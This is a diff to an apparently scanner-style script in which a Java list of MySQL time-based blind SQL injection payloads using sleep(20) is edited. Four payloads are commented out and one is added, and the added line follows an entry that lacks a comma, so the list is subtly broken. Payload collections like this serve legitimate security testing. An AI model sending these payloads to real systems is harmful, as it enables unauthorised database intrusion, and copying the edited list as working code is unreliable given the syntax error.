@@ -13,24 +13,25 @@ source: |+
   **/
 
   var payloads = java.util.List.of(
-    "'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z",
+    //"'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z",
     "'XOR(if(isnull(nullif(now(),sysdate())),sleep(20),0))XOR'Z",
     "'(select(1)from(select(sleep(20)))a)'",
     "(select(1)from(select(sleep(20)))a)",
     "(select(1)from(select(sleep(20)))a)-- z",
-    "'+(select(1)from(select(sleep(20)))a)+'",
+    //"'+(select(1)from(select(sleep(20)))a)+'",
     "-(select(1)from(select(sleep(20)))a)",
     ",(select(1)from(select(sleep(20)))a)",
     ",(select(1)from(select(sleep(20)))a)-- z",
-    "'OR(select(1)from(select(sleep(20)))a)OR'Z",
+    //"'OR(select(1)from(select(sleep(20)))a)OR'Z",
     "'AND(select(1)from(select(sleep(20)))a)AND'Z",
     " AND (select(1)from(select(sleep(20)))a)-- z",
     "' AND (select(1)from(select(sleep(20)))a)-- z",
     ") AND (select(1)from(select(sleep(20)))a)-- z",
     "') AND (select(1)from(select(sleep(20)))a)-- z",
     "->test\"',(select(1)from(select(sleep(20)))a)-- z\"'",
-    "->test\"'))# (select(1)from(select(sleep(20)))a)-- z",
+    //"->test\"'))# (select(1)from(select(sleep(20)))a)-- z",
     "->test\"' ASC, (select(1)from(select(sleep(20)))a)) DESC-- z\"'"
+    "->test\"') XOR (select(1)from(select(sleep(20)))a)-- z\"'",
   );
 
   var bypassCache = true;
